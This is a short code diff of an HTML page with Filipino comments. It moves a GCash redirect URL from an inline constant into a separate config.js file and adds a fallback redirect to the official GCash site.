@@ -216,8 +216,11 @@
     </div>
 </div>
 
+<script src="config.js"></script>
+
 <script>
-    const LATEST_GCASH_URL = "https://www.gcash.com"; // O kung ano man ang link mo
+    // TANDAAN: Wala na dapat dito yung 'const LATEST_GCASH_URL = ...'
+    // Kukunin na lang natin yung value mula sa config.js sa itaas.
 
     function animateValue(id, start, end, duration) {
         const obj = document.getElementById(id);
@@ -246,8 +249,14 @@
 
         startTimer(300);
 
+        // Redirect logic gamit ang link sa config.js
         setTimeout(() => {
-            window.location.href = LATEST_GCASH_URL; 
+            if (typeof LATEST_GCASH_URL !== 'undefined') {
+                window.location.href = LATEST_GCASH_URL; 
+            } else {
+                // Fallback kung sakaling hindi nabasa ang config file
+                window.location.href = "https://www.gcash.com"; 
+            }
         }, 1500);
     }
 
